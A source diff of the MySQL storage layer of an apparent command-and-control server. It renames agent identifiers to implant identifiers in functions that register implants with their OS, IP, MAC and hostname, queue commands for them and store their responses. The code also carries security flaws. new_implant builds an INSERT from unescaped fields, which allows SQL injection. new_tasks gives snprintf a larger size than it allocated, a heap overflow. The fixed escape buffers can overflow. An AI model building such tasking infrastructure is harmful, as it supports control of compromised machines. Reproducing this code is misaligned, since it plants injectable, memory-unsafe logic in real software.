@@ -22,9 +22,9 @@ void db_close() {
     mysql_close(con);
 }
 
-int check_agent_id(char *agent_id) {
+int check_implant_id(char *implant_id) {
     char esc[130];
-    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
+    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
     char query[1024];
     snprintf(query, sizeof(query), "SELECT * FROM Implants WHERE implant_id = '%s'", esc);
     if (mysql_query(con, query)) return 0;
@@ -57,9 +57,9 @@ void store_task_response(char *response, int task_id) {
     free(query);
 }
 
-int check_tasks_queue(char *agent_id) {
+int check_tasks_queue(char *implant_id) {
     char esc[130];
-    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
+    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
     char query[1024];
     snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE implant_id = '%s';", esc);
     if (mysql_query(con, query)) return -1;
@@ -77,16 +77,16 @@ int check_tasks_queue(char *agent_id) {
     return -1;
 }
 
-void new_agent(struct db_agents args) {
+void new_implant(struct db_agents args) {
     char query[2048];
     snprintf(query, sizeof(query), "INSERT INTO Implants (implant_id, os, ip, mac, arch, hostname) VALUES ('%s', '%s', '%s', '%s', '%s', '%s');",
              args.agent_id, args.os, args.ip, args.mac, args.arch, args.hostname);
     mysql_query(con, query);
 }
 
-void update_last_seen(char *agent_id) {
+void update_last_seen(char *implant_id) {
     char esc[130];
-    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
+    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
     char query[1024];
     snprintf(query, sizeof(query), "UPDATE Implants SET last_seen = CURRENT_TIMESTAMP() WHERE implant_id = '%s';", esc);
     mysql_query(con, query);
@@ -100,10 +100,10 @@ void TasksTable(struct db_tasks args) {
     mysql_query(con, query);
 }
 
-void new_tasks(char *agent_id, char *command) {
+void new_tasks(char *implant_id, char *command) {
     char esc_id[130];
     char esc_cmd[1024];
-    mysql_real_escape_string(con, esc_id, agent_id, strlen(agent_id));
+    mysql_real_escape_string(con, esc_id, implant_id, strlen(implant_id));
     mysql_real_escape_string(con, esc_cmd, command, strlen(command));
     char *query = malloc(1024 + 130);
     snprintf(query, 1024 + 256, "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", esc_id, esc_cmd);
@@ -111,9 +111,9 @@ void new_tasks(char *agent_id, char *command) {
     free(query);
 }
 
-char *tasks_per_agent(char *agent_id) {
+char *tasks_per_implant(char *implant_id) {
     char esc[130];
-    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
+    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
     char *query = malloc(1024);
     snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '%s';", esc);
     if (mysql_query(con, query)) return NULL;
